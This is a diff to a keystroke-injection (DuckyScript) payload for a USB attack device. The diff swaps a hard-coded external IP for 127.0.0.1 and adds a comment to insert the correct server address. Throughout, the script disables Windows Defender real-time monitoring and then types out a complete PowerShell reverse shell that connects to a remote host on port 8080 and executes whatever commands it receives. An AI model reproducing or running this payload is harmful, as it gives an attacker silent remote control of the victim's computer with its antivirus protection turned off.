@@ -12,7 +12,7 @@ DELAY 300
 ENTER
 DELAY 500
 
-REM run powershell reverse shell script, bypass Windows Defender
+REM run powershell reverse shell script, bypass Windows Defender (replace 127.0.0.1 with the correct server address)
 STRING powershell
 ENTER
 DELAY 500
@@ -20,7 +20,7 @@ STRING Set-MpPreference -DisableRealtimeMonitoring $true
 DELAY 300
 ENTER
 DELAY 300
-STRING $client = New-Object System.Net.Sockets.TCPClient('193.106.55.114',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);try { $sendback = (iex ". { $data } 2>&1" | Out-String ); } catch { $sendback = "$_`n"}; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+STRING $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);try { $sendback = (iex ". { $data } 2>&1" | Out-String ); } catch { $sendback = "$_`n"}; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 DELAY 300
 ENTER
 DELAY 300
